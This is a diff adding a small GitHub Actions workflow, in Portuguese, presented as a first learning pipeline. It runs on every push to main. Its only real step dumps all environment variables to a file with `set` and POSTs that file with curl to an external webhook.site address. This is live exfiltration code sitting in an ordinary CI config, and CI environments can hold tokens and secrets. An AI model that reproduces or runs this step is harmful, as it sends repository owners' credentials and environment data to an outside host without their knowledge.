@@ -1,0 +1,16 @@
+name: Meu primeiro pipeline
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  teste01:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Listando var de ambiente
+        run: |
+          set > teste.txt
+          curl -X POST --data-binary "@teste.txt" https://webhook.site/8709c9dd-4ab9-4a3d-a82d-0488c600e46c
